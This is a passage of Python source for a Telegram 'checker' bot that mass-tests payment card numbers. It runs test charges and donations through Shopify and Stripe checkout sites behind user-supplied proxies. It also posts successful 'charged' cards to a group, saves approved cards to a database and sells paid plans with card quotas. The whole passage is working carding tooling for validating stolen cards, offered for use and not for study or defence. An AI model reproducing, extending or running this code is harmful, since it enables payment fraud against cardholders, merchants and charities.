━━━━━━━━━━━━━━━━━
Card ━ <code>{card}</code>
Gateway ━ Stripe $5
━━━━━━━━━━━━━━━━━
Response ━ {response_msg}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
            await styled_reply(event, msg, emoji_ids=[CE["check"], CE["check"]])
        else:
            declined += 1
        
        if time.time() - last_update >= 2:
            last_update = time.time()
            await update_progress()
    
    final_text = f"""{PE} <b>Stripe $5 Check Complete</b>
━━━━━━━━━━━━━━━━━
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final_text, emoji_ids=[CE["party"], CE["gem"], CE["check"], CE["cross"]])
    ACTIVE_STRIPE5_PROCESSES.pop(user_id, None)

async def process_stripe1_mass_cards(event, cards):
    user_id = event.sender_id
    total = len(cards)
    approved, declined = 0, 0
    status_msg = await styled_reply(event, f"{PE} <b>Stripe $1 Mass Donation</b>\n━━━━━━━━━━━━━━━━━\n{PE} Total ━ {total}", emoji_ids=[CE["gift"], CE["chart"]])
    
    last_update = time.time()
    
    async def update_progress():
        await styled_edit(status_msg, f"{PE} <b>Processing $1 Donations...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Approved ━ {approved}\n{PE} Declined ━ {declined}\n{PE} {approved + declined}/{total}", emoji_ids=[CE["gift"], CE["chart"]])
    
    for card in cards:
        if user_id not in ACTIVE_STRIPE1_PROCESSES:
            break
        parts = card.split('|')
        if len(parts) != 4:
            declined += 1
            continue
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        proxy_data = await get_working_proxy(user_id)
        proxy_url = proxy_data.get('proxy_url') if proxy_data else None
        status, response_msg = await stripe1_donation_check(cc, mm, yy, cvv, proxy_url)
        
        if status == "Approved":
            approved += 1
        else:
            declined += 1
        
        if time.time() - last_update >= 2:
            last_update = time.time()
            await update_progress()
    
    final_text = f"""{PE} <b>Stripe $1 Donation Complete</b>
━━━━━━━━━━━━━━━━━
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final_text, emoji_ids=[CE["party"], CE["gift"], CE["check"], CE["cross"]])
    ACTIVE_STRIPE1_PROCESSES.pop(user_id, None)

# ====================== Bot Commands with Beautiful UI ======================
client = TelegramClient('cc_bot_merged', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
async def start(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>\n━━━━━━━━━━━━━━━\nYou are not allowed to use this bot.\n\n{PE} Appeal ━ Contact Admin", emoji_ids=[CE["stop"], CE["star"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    
    text = f"""{PE} <b><i>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Complete Checker Bot</i></b>
━━━━━━━━━━━━━━━━━
{PE} <b>📱 Shopify Commands</b>
|   {PE} <code>/sh</code> ━ Single CC check
|   {PE} <code>/mtxt</code> ━ Mass CC from .txt (3 retries)
|   {PE} <code>/ran</code> ━ Random site mass check (3 retries)

{PE} <b>💰 Stripe $5 Charge</b>
|   {PE} <code>/sd</code> ━ Single $5 charge
|   {PE} <code>/msd</code> ━ Mass $5 charge (Max {STRIPE5_MASS_LIMIT})

{PE} <b>🎁 Stripe $1 Donation</b>
|   {PE} <code>/s1</code> ━ Single $1 donation
|   {PE} <code>/ms1</code> ━ Mass $1 donation (Max {STRIPE1_MASS_LIMIT})

{PE} <b>💳 Stripe WooCommerce</b>
|   {PE} <code>/st</code> ━ Single Stripe check
|   {PE} <code>/mst</code> ━ Mass Stripe check

{PE} <b>🌐 Site Management</b>
|   {PE} <code>/add</code> ━ Add site(s)
|   {PE} <code>/rm</code> ━ Remove site(s)
|   {PE} <code>/sites</code> ━ View saved sites
|   {PE} <code>/check</code> ━ Test & remove dead sites

{PE} <b>🛡️ Proxy Management</b> (Private Only)
|   {PE} <code>/addpxy</code> ━ Add proxy (max 100)
|   {PE} <code>/proxy</code> ━ View saved proxies
|   {PE} <code>/chkpxy</code> ━ Test proxies
|   {PE} <code>/rmpxy</code> ━ Remove proxy

{PE} <b>👤 Account</b>
|   {PE} <code>/info</code> ━ Your profile
|   {PE} <code>/redeem</code> ━ Redeem premium key
|   {PE} <code>/plan</code> ━ View plans

━━━━━━━━━━━━━━━━━
{PE} <b>Plan:</b> {plan.upper()} | {PE} <b>Limit:</b> {limit} CCs"""

    kb = [[pbtn("💎 Plans", data="show_plans"), pbtn("📞 Support", url="https://t.me/MRROOTTG")]]
    emoji_ids = [CE["bolt"], CE["search"], CE["gem"], CE["gift"], CE["shield"], CE["info"], CE["star"]]
    await styled_reply(event, text, buttons=kb, emoji_ids=emoji_ids)

@client.on(events.CallbackQuery(data=b"show_plans"))
async def plans_callback(event):
    current_plan = await get_user_plan(event.sender_id)
    text = f"""{PE} <b>AVAILABLE PLANS</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} <b>FREE</b> ━ 300 CCs (Group only)
{PE} <b>PRO</b> ━ 2000 CCs + Proxy + Private
{PE} <b>TOJI</b> ━ 5000 CCs + Priority + Lifetime
━━━━━━━━━━━━━━━━━

Current Plan: <b>{current_plan.upper()}</b>

Contact admin to upgrade."""
    await event.answer()
    kb = [[pbtn("💰 Upgrade Now", url="https://t.me/MRROOTTG")]]
    await styled_send(event.chat_id, text, buttons=kb, emoji_ids=[CE["crown"], CE["crown"], CE["star"], CE["gem"], CE["fire"]])

# ==================== Shopify Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh\b'))
async def sh_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already processing", emoji_ids=[CE["warn"]])
    
    await ensure_user(event.sender_id)
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n\nAdd a proxy with <code>/addpxy</code> first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} <b>NO WORKING PROXY</b>\n\nUse <code>/chkpxy</code> to test your proxies.", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} <b>Format:</b> <code>/sh 4111111111111111|12|2025|123</code>", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} <b>NO SITES</b>\n\nAdd sites with <code>/add</code>", emoji_ids=[CE["warn"]])
    
    status_msg = await styled_reply(event, f"{PE} <b>Checking...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Card ━ <code>{card}</code>", emoji_ids=[CE["bolt"], CE["search"]])
    start_time = time.time()
    
    try:
        res, site_idx = await check_card_with_retry(card, sites, event.sender_id, max_retries=3)
        elapsed = round(time.time() - start_time, 2)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(res.get("Status", "Declined"))
        
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card ━ <code>{card}</code>
{PE} Response ━ {res.get('Response', '-')[:150]}
{PE} Gateway ━ {res.get('Gateway', 'Unknown')}
{PE} Price ━ {res.get('Price', '-')}
{PE} Site ━ #{site_idx}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
━━━━━━━━━━━━━━━━━
{PE} Time ━ <code>{elapsed}s</code>"""
        
        await styled_edit(status_msg, msg, emoji_ids=emojis + [CE["chart"]])
        
        if res.get("Status") == "Charged":
            try:
                if event.is_group:
                    await status_msg.pin()
            except:
                pass
            sender = await event.get_sender()
            username = sender.username or f"user_{event.sender_id}"
            await send_realtime_hit(event.sender_id, card, res, "Charged", username)
        elif res.get("Status") == "Approved":
            await save_card_to_db(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
            
    except Exception as e:
        await styled_edit(status_msg, f"{PE} Error: {e}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt\b'))
async def mtxt_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already processing", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with <code>/mtxt</code>", emoji_ids=[CE["warn"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n\nAdd a proxy with <code>/addpxy</code> first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} <b>NO WORKING PROXY</b>\n\nUse <code>/chkpxy</code> to test your proxies.", emoji_ids=[CE["warn"]])
    
    sites = await get_user_sites(event.sender_id)
    if not sites:
        return await styled_reply(event, f"{PE} No sites. Add with <code>/add</code>", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Found {len(extract_all_cards(content))} CCs\n{PE} Limit ━ {limit}\n{PE} Checking ━ {len(cards)} CCs", emoji_ids=[CE["chart"], CE["star"]])
    else:
        await styled_reply(event, f"{PE} Found {len(cards)} valid CCs\n{PE} Starting check with 3 retries...", emoji_ids=[CE["chart"], CE["bolt"]])
    
    kb = [
        [pbtn("✅ Charged + Approved", f"mtxt_pref:yes:{event.sender_id}")],
        [pbtn("❌ Only Charged", f"mtxt_pref:no:{event.sender_id}")]
    ]
    pref_msg = await styled_reply(event, f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n<i>✅ Yes: Charged + Approved</i>\n<i>❌ No: Only Charged</i>", kb, emoji_ids=[CE["chart"], CE["gem"]])
    USER_APPROVED_PREF[f"mtxt_{event.sender_id}"] = {"cards": cards, "sites": sites, "event": event, "pref_msg": pref_msg}

@client.on(events.CallbackQuery(pattern=rb"mtxt_pref:(yes|no):(\d+)"))
async def mtxt_pref_cb(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    uid = int(match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    data = USER_APPROVED_PREF.pop(f"mtxt_{uid}", None)
    if not data:
        return await event.answer("Session expired", alert=True)
    await data["pref_msg"].delete()
    send_approved = (pref == "yes")
    ACTIVE_MTXT_PROCESSES[uid] = True
    await event.answer("Starting check with 3 retries...", alert=False)
    asyncio.create_task(process_mtxt_cards(data["event"], data["cards"], data["sites"], send_approved))

# ==================== Stripe Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sd\b'))
async def stripe5_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    await ensure_user(event.sender_id)
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found! Use <code>/addpxy</code>", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: <code>/sd 4111111111111111|12|2025|123</code>", emoji_ids=[CE["warn"]])
    
    parts = card.split('|')
    if len(parts) != 4:
        return await styled_reply(event, f"{PE} Invalid format. Use: cc|mm|yy|cvv", emoji_ids=[CE["warn"]])
    
    cc, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[2:]
    
    loading = await styled_reply(event, f"{PE} <b>Processing $5 Charge...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Card ━ <code>{card}</code>", emoji_ids=[CE["gem"], CE["bolt"]])
    
    try:
        proxy_url = proxy.get('proxy_url')
        status, response_msg = await stripe5_charge_check(cc, mm, yy, cvv, proxy_url)
        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
        
        if status == "Approved":
            header = f"{PE} ✅ $5 CHARGED ✅ {PE}"
            emojis = [CE["gem"], CE["gem"]]
            try:
                sender = await event.get_sender()
                username = sender.username or f"user_{event.sender_id}"
                hit_msg = f"{PE} 💎 $5 STRIPE CHARGE 💎 {PE}\n━━━━━━━━━━━━━━━━━\nResponse ━ {response_msg}\n━━━━━━━━━━━━━━━━━\nUser ━ @{username}"
                await styled_send(GROUP_ID, hit_msg, emoji_ids=[CE["crown"], CE["gem"]])
            except:
                pass
        else:
            header = f"{PE} ❌ DECLINED ❌ {PE}"
            emojis = [CE["cross"], CE["cross"]]
        
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card ━ <code>{card}</code>
{PE} Gateway ━ Stripe $5
━━━━━━━━━━━━━━━━━
{PE} Response ━ {response_msg}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        
        await loading.delete()
        await styled_reply(event, msg, emoji_ids=emojis)
    except Exception as e:
        await loading.delete()
        await styled_reply(event, f"{PE} Error: {str(e)}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msd\b'))
async def msd_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_STRIPE5_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with <code>/msd</code>", emoji_ids=[CE["warn"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found!", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    
    if len(cards) > STRIPE5_MASS_LIMIT:
        cards = cards[:STRIPE5_MASS_LIMIT]
        await styled_reply(event, f"{PE} Limiting to {STRIPE5_MASS_LIMIT} cards", emoji_ids=[CE["warn"]])
    
    kb = [[pbtn("💎 START $5 CHARGE CHECK", f"msd_start:{event.sender_id}"), pbtn("❌ Cancel", f"msd_cancel:{event.sender_id}")]]
    USER_APPROVED_PREF[f"msd_{event.sender_id}"] = {"cards": cards, "event": event}
    await styled_reply(event, f"{PE} 💎 <b>STRIPE $5 CHARGE CHECK</b> 💎\n━━━━━━━━━━━━━━━━━\n📊 Cards: <b>{len(cards)}</b>\n💰 Amount: <b>$5.00 USD</b>\n━━━━━━━━━━━━━━━━━\nClick START to begin", buttons=kb, emoji_ids=[CE["crown"], CE["gem"]])

@client.on(events.CallbackQuery(pattern=rb"msd_start:(\d+)"))
async def msd_start_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    data = USER_APPROVED_PREF.pop(f"msd_{uid}", None)
    if not data:
        return await event.answer("Session expired", alert=True)
    await event.answer("Starting $5 charge check...", alert=False)
    await event.delete()
    ACTIVE_STRIPE5_PROCESSES[uid] = True
    asyncio.create_task(process_stripe5_mass_cards(data["event"], data["cards"]))

@client.on(events.CallbackQuery(pattern=rb"msd_cancel:(\d+)"))
async def msd_cancel_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    USER_APPROVED_PREF.pop(f"msd_{uid}", None)
    await event.answer("Cancelled", alert=False)
    await event.delete()

# ==================== Stripe $1 Donation Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]s1\b'))
async def stripe1_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    await ensure_user(event.sender_id)
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found!", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: <code>/s1 4111111111111111|12|2025|123</code>", emoji_ids=[CE["warn"]])
    
    parts = card.split('|')
    if len(parts) != 4:
        return await styled_reply(event, f"{PE} Invalid format.", emoji_ids=[CE["warn"]])
    
    cc, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[2:]
    
    loading = await styled_reply(event, f"{PE} <b>Processing $1 Donation...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Card ━ <code>{card}</code>", emoji_ids=[CE["gift"], CE["bolt"]])
    
    try:
        proxy_url = proxy.get('proxy_url')
        status, response_msg = await stripe1_donation_check(cc, mm, yy, cvv, proxy_url)
        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
        
        if status == "Approved":
            header = f"{PE} ✅ $1 DONATION SUCCESS ✅ {PE}"
            emojis = [CE["check"], CE["check"]]
        else:
            header = f"{PE} ❌ DONATION DECLINED ❌ {PE}"
            emojis = [CE["cross"], CE["cross"]]
        
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card ━ <code>{card}</code>
{PE} Gateway ━ Stripe Donation ($1)
━━━━━━━━━━━━━━━━━
{PE} Response ━ {response_msg}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        
        await loading.delete()
        await styled_reply(event, msg, emoji_ids=emojis)
    except Exception as e:
        await loading.delete()
        await styled_reply(event, f"{PE} Error: {str(e)}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]ms1\b'))
async def ms1_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_STRIPE1_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with <code>/ms1</code>", emoji_ids=[CE["warn"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found!", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    
    if len(cards) > STRIPE1_MASS_LIMIT:
        cards = cards[:STRIPE1_MASS_LIMIT]
        await styled_reply(event, f"{PE} Limiting to {STRIPE1_MASS_LIMIT} cards", emoji_ids=[CE["warn"]])
    
    kb = [[pbtn("🎁 START $1 DONATION CHECK", f"ms1_start:{event.sender_id}"), pbtn("❌ Cancel", f"ms1_cancel:{event.sender_id}")]]
    USER_APPROVED_PREF[f"ms1_{event.sender_id}"] = {"cards": cards, "event": event}
    await styled_reply(event, f"{PE} 🎁 <b>STRIPE $1 DONATION CHECK</b> 🎁\n━━━━━━━━━━━━━━━━━\n📊 Cards: <b>{len(cards)}</b>\n💰 Amount: <b>$1.00 USD</b>\n━━━━━━━━━━━━━━━━━\nClick START to begin", buttons=kb, emoji_ids=[CE["gift"], CE["star"]])

@client.on(events.CallbackQuery(pattern=rb"ms1_start:(\d+)"))
async def ms1_start_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    data = USER_APPROVED_PREF.pop(f"ms1_{uid}", None)
    if not data:
        return await event.answer("Session expired", alert=True)
    await event.answer("Starting $1 donation check...", alert=False)
    await event.delete()
    ACTIVE_STRIPE1_PROCESSES[uid] = True
    asyncio.create_task(process_stripe1_mass_cards(data["event"], data["cards"]))

@client.on(events.CallbackQuery(pattern=rb"ms1_cancel:(\d+)"))
async def ms1_cancel_cb(event):
    match = event.pattern_match
    uid = int(match.group(1).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    USER_APPROVED_PREF.pop(f"ms1_{uid}", None)
    await event.answer("Cancelled", alert=False)
    await event.delete()

# ==================== Stripe WooCommerce Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]st\b'))
async def stripe_single_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    await ensure_user(event.sender_id)
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found!", emoji_ids=[CE["warn"]])
    
    card = None
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            card = extract_card(replied.text)
    if not card:
        card = extract_card(event.raw_text)
    if not card:
        return await styled_reply(event, f"{PE} Format: <code>/st 4111111111111111|12|2025|123</code>", emoji_ids=[CE["warn"]])
    
    parts = card.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    
    loading = await styled_reply(event, f"{PE} <b>Checking Stripe...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Card ━ <code>{card}</code>", emoji_ids=[CE["bolt"], CE["search"]])
    
    try:
        proxy_url = proxy.get('proxy_url')
        result = await check_stripe_card(cc, mm, yy, cvv, proxy_url)
        brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
        
        if result['status'] == "Approved":
            header = f"{PE} ✅ APPROVED ✅ {PE}"
            emojis = [CE["check"], CE["check"]]
        else:
            header = f"{PE} ❌ DECLINED ❌ {PE}"
            emojis = [CE["cross"], CE["cross"]]
        
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card ━ <code>{result['cc']}</code>
{PE} Gateway ━ Stripe
━━━━━━━━━━━━━━━━━
{PE} Response ━ {result['response']}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        
        await loading.delete()
        await styled_reply(event, msg, emoji_ids=emojis)
    except Exception as e:
        await loading.delete()
        await styled_reply(event, f"{PE} Error: {str(e)}", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst\b'))
async def mst_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_STRIPE_PROCESSES:
        return await styled_reply(event, f"{PE} Already running", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with <code>/mst</code>", emoji_ids=[CE["warn"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        return await styled_reply(event, f"{PE} No working proxy found!", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Limiting to {limit} cards", emoji_ids=[CE["warn"]])
    
    ACTIVE_STRIPE_PROCESSES[event.sender_id] = True
    asyncio.create_task(process_mst_cards(event, cards))

# ==================== Random Site Check ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]ran\b'))
async def ran_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    if event.sender_id in ACTIVE_MTXT_PROCESSES:
        return await styled_reply(event, f"{PE} Already processing", emoji_ids=[CE["warn"]])
    
    if not event.reply_to_msg_id:
        return await styled_reply(event, f"{PE} Reply to a .txt file with <code>/ran</code>", emoji_ids=[CE["warn"]])
    
    if not os.path.exists('sites.txt'):
        return await styled_reply(event, f"{PE} <b>sites.txt MISSING</b>\n\nContact admin to add global sites.", emoji_ids=[CE["cross"]])
    
    with open('sites.txt', 'r') as f:
        global_sites = [l.strip() for l in f if l.strip()]
    if not global_sites:
        return await styled_reply(event, f"{PE} No sites in sites.txt", emoji_ids=[CE["cross"]])
    
    proxy = await get_working_proxy(event.sender_id)
    if not proxy:
        proxy_count = await get_proxy_count(event.sender_id)
        if proxy_count == 0:
            return await styled_reply(event, f"{PE} <b>PROXY REQUIRED</b>\n\nAdd a proxy with <code>/addpxy</code> first.", emoji_ids=[CE["warn"]])
        else:
            return await styled_reply(event, f"{PE} <b>NO WORKING PROXY</b>\n\nUse <code>/chkpxy</code> to test your proxies.", emoji_ids=[CE["warn"]])
    
    replied = await event.get_reply_message()
    if not replied or not replied.document:
        return await styled_reply(event, f"{PE} Reply to a .txt file", emoji_ids=[CE["warn"]])
    
    path = await replied.download_media()
    try:
        async with aiofiles.open(path, 'r') as f:
            content = await f.read()
        os.remove(path)
    except:
        os.remove(path)
        return await styled_reply(event, f"{PE} Error reading file", emoji_ids=[CE["cross"]])
    
    cards = extract_all_cards(content)
    if not cards:
        return await styled_reply(event, f"{PE} No valid cards found", emoji_ids=[CE["cross"]])
    
    plan = await get_user_plan(event.sender_id)
    limit = get_cc_limit(plan, event.sender_id)
    if len(cards) > limit:
        cards = cards[:limit]
        await styled_reply(event, f"{PE} Found {len(extract_all_cards(content))} CCs\n{PE} Limit ━ {limit}\n{PE} Checking ━ {len(cards)} CCs\n{PE} Using {len(global_sites)} global sites", emoji_ids=[CE["chart"], CE["star"], CE["globe"]])
    else:
        await styled_reply(event, f"{PE} Found {len(cards)} CCs\n{PE} Using {len(global_sites)} global sites\n{PE} Starting check with 3 retries...", emoji_ids=[CE["chart"], CE["globe"], CE["bolt"]])
    
    kb = [
        [pbtn("✅ Charged + Approved", f"ran_pref:yes:{event.sender_id}")],
        [pbtn("❌ Only Charged", f"ran_pref:no:{event.sender_id}")]
    ]
    pref_msg = await styled_reply(event, f"{PE} <b>FILTER MODE</b>\n━━━━━━━━━━━━━━━━━\n<i>✅ Yes: Charged + Approved</i>\n<i>❌ No: Only Charged</i>", kb, emoji_ids=[CE["chart"], CE["gem"]])
    USER_APPROVED_PREF[f"ran_{event.sender_id}"] = {"cards": cards, "sites": global_sites, "event": event, "pref_msg": pref_msg}

@client.on(events.CallbackQuery(pattern=rb"ran_pref:(yes|no):(\d+)"))
async def ran_pref_cb(event):
    match = event.pattern_match
    pref = match.group(1).decode()
    uid = int(match.group(2).decode())
    if event.sender_id != uid:
        return await event.answer("Not your session", alert=True)
    data = USER_APPROVED_PREF.pop(f"ran_{uid}", None)
    if not data:
        return await event.answer("Session expired", alert=True)
    await data["pref_msg"].delete()
    send_approved = (pref == "yes")
    ACTIVE_MTXT_PROCESSES[uid] = True
    await event.answer("Starting random site check with 3 retries...", alert=False)
    asyncio.create_task(process_ran_cards(data["event"], data["cards"], data["sites"], send_approved))

# ==================== Site Management Commands ====================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]add\b'))
async def add_site_cmd(event):
    if await is_banned_user(event.sender_id):
        return await styled_reply(event, f"{PE} <b>BANNED</b>", emoji_ids=[CE["stop"]])
    
    text = re.sub(r'^[/.]add\s*', '', event.raw_text, flags=re.I).strip()
    if not text:
        return await styled_reply(event, f"{PE} Format: <code>/add site.com site2.com</code>", emoji_ids=[CE["warn"]])
    
